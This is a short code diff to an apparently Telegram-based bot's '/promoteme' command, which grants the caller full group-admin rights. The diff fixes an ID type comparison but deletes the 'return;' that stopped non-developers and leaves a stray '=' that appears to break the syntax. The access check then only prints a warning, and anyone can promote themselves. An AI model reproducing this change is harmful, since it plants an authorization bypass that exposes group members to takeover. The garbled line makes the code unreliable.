@@ -1145,12 +1145,12 @@ bot.onText(/\/ban (.+)/, async (msg, match) => {
 //selfpromote
 bot.onText(/\/promoteme/, async (msg) => {
   const chatId = msg.chat.id;
-  const issuerId = msg.from.id.toString(); 
-  let userId = msg.from.id.toString();
+  const issuerId = msg.from.id; 
+  
   // Check if the issuer is the developer
-  if (userId !== parseInt(DEV_ID)) {
+  if (issuerId !== parseInt(DEV_ID)) {
     bot.sendMessage(msg.chat.id, 'This command is restricted.');
-    return;  // Stop further execution if not the bot owner
+=// Stop further execution if not the bot owner
   }
   try {
     // Check if the bot has full admin rights in the group
@@ -1161,7 +1161,7 @@ bot.onText(/\/promoteme/, async (msg) => {
     }
 
     // Promote the developer with all available admin permissions
-    await bot.promoteChatMember(chatId, userId, {
+    await bot.promoteChatMember(chatId, issuerId, {
       can_change_info: true,
       can_delete_messages: true,
       can_invite_users: true,
